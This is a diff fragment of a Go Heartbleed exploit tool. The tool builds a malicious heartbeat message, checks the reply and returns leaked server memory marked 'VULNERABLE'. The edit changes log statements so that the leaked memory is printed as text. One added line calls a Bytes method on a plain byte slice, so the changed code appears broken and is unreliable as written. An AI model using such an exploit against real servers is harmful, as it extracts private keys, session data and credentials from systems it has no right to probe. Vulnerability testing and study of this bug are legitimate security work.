@@ -51,9 +51,9 @@ func buildEvilMessage(payload []byte) []byte {
 func heartbleedCheck(conn *tls.Conn, buf *bytes.Buffer, vuln chan bool) func([]byte) {
 	return func(data []byte) {
 	  	//spew.Printf("buf: %v -- data: %+v", buf, data)
-		log.Printf("Before Fdump: buf - %v ... data - %v",  buf, data)
+		log.Printf("Before Fdump: buf - %s ... data - %s",  buf, data)
 		spew.Fdump(buf, data)
-		log.Printf("After Fdump: buf - %v ... data - %v",  buf, data)
+		log.Printf("After Fdump: buf - %s ... data - %s",  buf, data)
 		if bytes.Index(data, padding) == -1 {
 			vuln <- false
 		} else {
@@ -112,7 +112,7 @@ func Heartbleed(tgt *Target, payload []byte) (out []byte, err error) {
 		if status {
 			out = buf.Bytes()
 			//spew.Printf("out: %v -- out.Bites(): %v", out, out.Bytes())
-			log.Printf("out: %v -- out.Bites(): %v", out, out.Bytes())
+			log.Printf("out: %s -- out.Bites(): %s", out, out.Bytes())
 			return out, nil // VULNERABLE
 		} else if err != nil {
 			return
